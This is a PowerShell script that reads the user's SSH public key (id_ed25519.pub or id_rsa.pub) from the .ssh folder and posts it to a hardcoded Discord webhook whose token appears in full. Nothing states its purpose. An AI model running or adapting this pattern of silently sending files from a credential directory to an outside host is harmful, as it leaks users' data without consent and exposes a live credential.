$webhookUrl = "https://discord.com/api/webhooks/1473656435102584892/AFcCR4OpM4ayvNJpwJ74sRQWo_Js4cVO40u48WP5IduqL0qCs4qNL7smadkv-0rwWHUo"

$homeDir = $env:USERPROFILE
if (-not $homeDir) { $homeDir = $env:HOME }

$sshDir = Join-Path $homeDir ".ssh"

$keyFiles = @("id_ed25519.pub", "id_rsa.pub")
$keyPath = $null

foreach ($keyName in $keyFiles) {
    $candidate = Join-Path $sshDir $keyName
    if (Test-Path $candidate) {
        $keyPath = $candidate
        break
    }
}

if (-not $keyPath) {
    Write-Host "No SSH public key found in $sshDir"
    exit 1
}

$content = Get-Content $keyPath -Raw | ForEach-Object { $_.Trim() }

$body = @{
    content = "``````n$content`n``````"
} | ConvertTo-Json -Compress

$response = Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $body -ContentType "application/json"
Write-Host $response
